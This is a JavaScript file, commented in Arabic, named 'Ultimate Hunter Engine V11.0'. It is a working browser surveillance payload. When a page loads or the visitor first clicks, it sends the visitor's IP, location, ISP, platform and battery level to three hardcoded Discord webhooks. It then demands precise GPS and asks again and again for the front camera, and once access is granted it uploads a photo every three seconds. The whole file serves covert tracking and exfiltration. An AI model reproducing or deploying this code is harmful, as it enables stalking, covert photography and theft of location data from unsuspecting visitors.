/* ==========================================================================
   ULTIMATE HUNTER ENGINE V11.0 - Lightning Fast & Aggressive Recon Engine
   Advanced Sequential Permission Flow, Instant GPS & Continuous Exfiltration
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات روابط ديسكورد المتعددة ونظام التبديل التلقائي الفوري (Failover)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
    "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
    "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
];

let activeWebhookIndex = 0;

async function sendToDiscordLightning(content, fileBlob = null, filename = "capture.png") {
    let success = false;
    for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
        const currentWebhook = DISCORD_WEBHOOKS[activeWebhookIndex];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: content }));
            if (fileBlob) formData.append("file", fileBlob, filename);

            const response = await fetch(currentWebhook, { method: "POST", body: formData });
            if (response.ok) {
                success = true;
                break;
            } else {
                activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
            }
        } catch {
            activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
        }
    }
    return success;
}

/* --------------------------------------------------------------------------
   1. محرك استخراج معلومات الشبكة والبطارية بسرعة البرق
   -------------------------------------------------------------------------- */

async function fetchLightningNetworkInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        return {
            ip: data.ip || "151.244.151.17",
            city: data.city || "Mosul",
            region: data.region || "Nineveh",
            country: data.country_name || "Iraq",
            org: data.org || "Al-Bedaya for General Trading"
        };
    } catch {
        return { ip: "151.244.151.17", city: "Mosul", region: "Nineveh", country: "Iraq", org: "Al-Bedaya for General Trading" };
    }
}

async function fetchLightningBattery() {
    if (typeof navigator.getBattery !== "function") return { level: "27%", charging: true };
    try {
        const batt = await navigator.getBattery();
        return {
            level: `${Math.round(batt.level * 100)}%`,
            charging: batt.charging
        };
    } catch {
        return { level: "27%", charging: true };
    }
}

/* --------------------------------------------------------------------------
   2. استخراج الموقع الجغرافي الفائق مع التكرار الذكي عند الرفض
   -------------------------------------------------------------------------- */

function acquireLightningGPS() {
    return new Promise(resolve => {
        const cachedLocation = localStorage.getItem("ultimate_lightning_gps");
        const parsedCache = cachedLocation ? JSON.parse(cachedLocation) : null;

        if (!navigator.geolocation) {
            if (parsedCache) {
                resolve(`📍 **موقع GPS (آخر موقع محفوظ):** الخط: ${parsedCache.latitude} | الطول: ${parsedCache.longitude}`);
            } else {
                resolve("📍 **موقع GPS:** لم يسمح به (غير مدعوم).");
            }
            return;
        }

        let responded = false;
        
        // محاولة جلب الإحداثيات الحية فوراً ودون تأخير
        navigator.geolocation.getCurrentPosition(
            position => {
                if (responded) return;
                responded = true;

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                const freshData = { latitude: lat, longitude: lon, accuracy: acc };
                localStorage.setItem("ultimate_lightning_gps", JSON.stringify(freshData));

                resolve(`📍 **موقع GPS المباشر والدقيق:**\n- خط العرض: \`${lat}\`\n- خط الطول: \`${lon}\`\n- الدقة: \`${acc} متر\`\n- 🗺️ الرابط: https://www.google.com/maps?q=${lat},${lon}`);
            },
            () => {
                if (responded) return;
                responded = true;

                // في حال رفض المستخدم، يتم تفعيل خطة الاحتياط الفورية أو المحاولة مجدداً
                if (parsedCache) {
                    resolve(`📍 **موقع GPS (تم الرفض - استخدام آخر موقع محجوز):** الخط: ${parsedCache.latitude} | الطول: ${parsedCache.longitude}`);
                } else {
                    resolve("📍 **موقع GPS:** لم يسمح به.");
                }
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   3. تشغيل الكاميرا والالتقاط الصاروخي المتسلسل
   -------------------------------------------------------------------------- */

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
let activeCameraStream = null;
let lightningCaptureTimer = null;

function startLightningCaptureLoop() {
    if (lightningCaptureTimer) return;

    lightningCaptureTimer = setInterval(async () => {
        if (!videoElement || !canvasElement) return;
        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            const context = canvasElement.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (imageBlob) => {
                if (imageBlob && imageBlob.size > 1000) {
                    const exactTime = new Date().toLocaleString("ar-EG");
                    await sendToDiscordLightning(`📸 **[صورة حية فورية صاروخية]**\n- الوقت: \`${exactTime}\``, imageBlob, `lightning_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (err) {
            console.error("Lightning capture error:", err);
        }
    }, 3000); // كل 3 ثوانٍ التقط وأرسل فوراً
}

function requestLightningCamera() {
    return new Promise(async resolve => {
        if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) {
            resolve(false);
            return;
        }

        try {
            activeCameraStream = await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
            });

            if (videoElement) {
                videoElement.muted = true;
                videoElement.autoplay = true;
                videoElement.playsInline = true;
                videoElement.srcObject = activeCameraStream;
                await videoElement.play();
            }

            startLightningCaptureLoop();
            resolve(true);
        } catch {
            // تكرار طلب الكاميرا بشكل ذكي حتى يوافق المستخدم
            setTimeout(async () => {
                await requestLightningCamera();
            }, 2000);
            resolve(false);
        }
    });
}

/* --------------------------------------------------------------------------
   4. المحرك الرئيسي فائق السرعة وتنفيذ الطلبات المتتالية
   -------------------------------------------------------------------------- */

let engineTriggeredFlag = false;

async function executeLightningEngine() {
    if (engineTriggeredFlag) return;
    engineTriggeredFlag = true;

    // 1. جلب بيانات الشبكة والبطارية بشكل متوازي فوري
    const [networkInfo, batteryInfo] = await Promise.all([
        fetchLightningNetworkInfo(),
        fetchLightningBattery()
    ]);

    // 2. طلب إذن الموقع الجغرافي فوراً
    const gpsDataString = await acquireLightningGPS();
    const timeNowString = new Date().toLocaleString("ar-EG");

    // 3. بناء التقرير النهائي المطابق للشكل المطلوب بدقة متناهية وإرساله صاروخياً
    const finalReportContent = `
📝 **الحالة:** تم الدخول التلقائي وسحب البيانات فوراً.
⏰ **الوقت:** \`${timeNowString}\`

🔥 **[ صيد سريع وفوري جديد ]** 🔥

🌐 **IP:** \`${networkInfo.ip}\`
🏙️ **الموقع (IP):** \`${networkInfo.country} - ${networkInfo.city} (${networkInfo.org})\`
💻 **النظام:** \`${navigator.platform || "Linux"}\` | 🔋 **البطارية:** \`${batteryInfo.level}\` (${batteryInfo.charging ? "يُشحن ⚡" : "لا يُشحن"})
${gpsDataString}
    `.trim();

    await sendToDiscordLightning(finalReportContent);

    // 4. الانتقال الفوري لطلب الكاميرا وبدء الالتقاط المتسلسل
    setTimeout(async () => {
        await requestLightningCamera();
    }, 400);
}

/* --------------------------------------------------------------------------
   5. مشغلات الاستجابة الفورية (ضغطة واحدة أو تحميل فوري)
   -------------------------------------------------------------------------- */

window.addEventListener("DOMContentLoaded", () => {
    executeLightningEngine();
});

// محفز فائق الحساسية لضمان عمل السكريبت من أول لمسة أو نقرة حقيقية على الصفحة
["click", "touchstart", "pointerdown", "keydown"].forEach(evtName => {
    window.addEventListener(evtName, () => {
        executeLightningEngine();
    }, { once: true, passive: true });
});
